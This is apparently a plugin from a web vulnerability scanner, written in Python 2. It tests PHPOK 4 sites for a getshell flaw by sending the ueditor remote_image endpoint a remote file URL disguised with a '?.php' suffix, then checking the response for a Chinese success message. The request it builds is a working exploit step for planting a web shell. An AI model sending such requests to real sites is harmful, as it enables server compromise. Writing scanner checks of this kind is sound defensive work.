#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
        key = u'远程图片抓取成功'
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "index.php?c=ueditor&f=remote_image&upfile=%s?.php"%(ob['rfi_url'])
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and (content.find(key.encode('utf8'))>=0 or content.find(key.encode('gbk'))>=0):
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:PHPOK4_GetshellScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:PHPOK4_GetshellScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
